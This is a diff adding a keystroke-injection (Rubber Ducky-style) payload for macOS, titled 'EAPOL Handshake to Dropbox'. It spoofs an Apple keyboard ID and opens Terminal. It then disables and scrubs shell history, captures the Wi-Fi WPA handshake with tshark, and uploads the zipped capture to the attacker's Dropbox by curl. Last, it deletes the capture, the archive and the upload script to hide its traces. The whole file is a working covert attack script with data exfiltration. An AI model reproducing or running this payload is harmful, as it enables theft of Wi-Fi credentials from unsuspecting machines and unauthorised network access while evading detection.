@@ -1,0 +1,76 @@
+REM This script discreetly grabs the .PCAP that will contain the FOUR EAPOL handshake keys 
+REM then zips the file renaming it Captured Handshake and sends it directly to your dropbox API.
+REM Replace '<API ACCESS TOKEN>' with your actual API access token.
+
+REM Requirements Wireshark (tshark) can download using the command 'brew install wireshark'
+REM Dropbox API token, you can find Documentation under my Executions readme.
+
+
+REM Author: Narsty
+REM Title: EAPOL Handshake to Dropbox
+REM Version 1.0 MacOs
+REM Category: Execution 
+
+
+ID 05ac:021e Apple:Keyboard
+DELAY 500
+GUI SPACE
+DELAY 500
+STRING terminal
+DELAY 1000
+ENTER
+DELAY 2000 
+STRING echo -e "export HISTCONTROL=ignorespace\nunset HISTFILE" >> ~/.bashrc && source ~/.bashrc && exec bash
+DELAY 500
+ENTER
+DELAY 500
+STRING history -d $(history | tail -n 2 | head -n 1 | awk '{ print $1 }')
+DELAY 500
+ENTER
+DELAY 500
+ENTER
+DELAY 500
+STRING  networksetup -setairportpower en0 off
+DELAY 500
+ENTER
+DELAY 1000
+STRING  tshark -i en0 -w ~/Desktop/captured.pcap & 
+DELAY 1000
+ENTER
+DELAY 6000
+STRING  networksetup -setairportpower en0 on
+DELAY 500
+ENTER 
+DELAY 3000
+STRING  pkill -f tshark
+DELAY 500
+ENTER
+DELAY 500 
+CTRL c
+DELAY 2000
+STRING  echo 'cd ~/Desktop && zip -r "CapturedHandshake.zip" captured.pcap && curl -X POST https://content.dropboxapi.com/2/files/upload -H "Authorization: Bearer <API ACCESS TOKEN>" -H "Dropbox-API-Arg: {\"path\": \"/Backup/CapturedHandshake.zip\",\"mode\": \"add\",\"autorename\": true,\"mute\": false}" -H "Content-Type: application/octet-stream" --data-binary @"CapturedHandshake.zip"' > upload.sh
+DELAY 500
+ENTER
+DELAY 500
+STRING  chmod +x upload.sh
+ENTER
+DELAY 500
+STRING  nohup ./upload.sh >/dev/null 2>&1 &
+DELAY 500
+ENTER
+DELAY 10000
+STRING  rm ~/Desktop/captured.pcap
+DELAY 500 
+ENTER
+STRING  rm ~/Desktop/CapturedHandshake.zip
+DELAY 500
+ENTER
+STRING  rm upload.sh
+DELAY 500
+ENTER
+DELAY 5000
+GUI w
+DELAY 500
+ENTER
+
+
